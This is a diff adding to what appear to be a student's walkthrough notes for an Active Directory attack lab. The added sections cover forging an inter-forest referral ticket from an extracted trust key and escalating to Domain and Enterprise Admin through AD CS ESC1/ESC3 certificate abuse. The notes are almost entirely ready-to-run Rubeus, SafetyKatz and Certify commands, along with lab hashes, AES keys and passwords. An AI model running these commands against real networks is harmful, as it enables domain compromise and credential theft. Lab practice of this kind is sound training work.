@@ -184,3 +184,121 @@ Credentials:
 ```
 
 > krbtgt:a0981492d5dfab1ae0b97b51ea895ddf
+
+***
+
+## Eurocorp Access — External Forest (LO20)
+
+> Different from LO18/19. SID History is filtered on external trusts. We forge a referral ticket using the trust key between dollarcorp and eurocorp, without SID History.
+
+### Extract trust key (dcorp ↔ eurocorp)
+
+> From DA cmd on dcorp-dc (same portproxy setup as LO18)
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+winrs -r:dcorp-dc cmd
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
+```
+
+> From the output look for `[ In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL`:
+>
+> * **aes256**: `a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac`
+> * **rc4**: `6c7869737f13b0dd2a47911f6e8cab60`
+
+### Forge referral ticket (no SID History)
+
+> Back on student VM:
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
+```
+
+Copy the base64 ticket from output, then:
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:TICKETBASE64HERE
+```
+
+### Verify access
+
+```
+dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
+```
+
+***
+
+## AD CS Attacks — ESC1 and ESC3 (LO21)
+
+### Enumerate CA and templates
+
+```
+C:\AD\Tools\Certify.exe cas
+C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
+C:\AD\Tools\Certify.exe find /vulnerable
+```
+
+### ESC1 — DA via HTTPSCertificates template
+
+> Template `HTTPSCertificates` allows requestor to supply Subject Name and RDPUsers can enroll.
+
+Request cert as Administrator (DA):
+
+```
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:administrator /sid:S-1-5-21-719815819-3726368948-3917688648-500
+```
+
+Save output (from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----`) to `C:\AD\Tools\esc1.pem`, then convert:
+
+```
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+## Export password: SecretPass@123
+```
+
+Use PFX to get TGT as DA:
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
+winrs -r:dcorp-dc cmd /c set username
+```
+
+### ESC1 — EA via HTTPSCertificates template
+
+```
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
+```
+
+Save to `esc1-EA.pem`, convert, then request TGT:
+
+```
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
+winrs -r:mcorp-dc cmd /c set username
+```
+
+### ESC3 — DA via SmartCardEnrollment templates
+
+> Two-step: first get Enrollment Agent cert, then use it to request DA cert on behalf of Administrator.
+
+Step 1 — Enrollment Agent cert:
+
+```
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
+## Save to esc3.pem
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
+```
+
+Step 2 — Request DA cert on behalf of Administrator:
+
+```
+C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
+## Save to esc3-DA.pem
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:C:\AD\Tools\esc3-DA.pfx /password:SecretPass@123 /ptt
+winrs -r:dcorp-dc cmd /c set username
+```
